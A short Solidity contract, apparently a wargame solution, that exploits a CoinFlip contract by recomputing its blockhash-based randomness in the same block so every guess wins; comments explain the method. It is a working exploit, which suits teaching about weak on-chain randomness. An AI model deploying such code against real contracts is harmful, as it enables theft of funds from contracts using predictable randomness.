// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// since CoinFlip contract uses blockhash + block.number - 1 to generate random number
// we just need to pass the guess using the same logic as the CoinFlip contract
// since it will all be executed in the same block, the blockhash will be the same
// and the guess will be correct every time

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlip coinFlipContract;
    address owner;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        owner = msg.sender;
        coinFlipContract = ICoinFlip(_coinFlip);
    }

    function attack() public {
        require(msg.sender == owner, "Only owner can call this function");
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
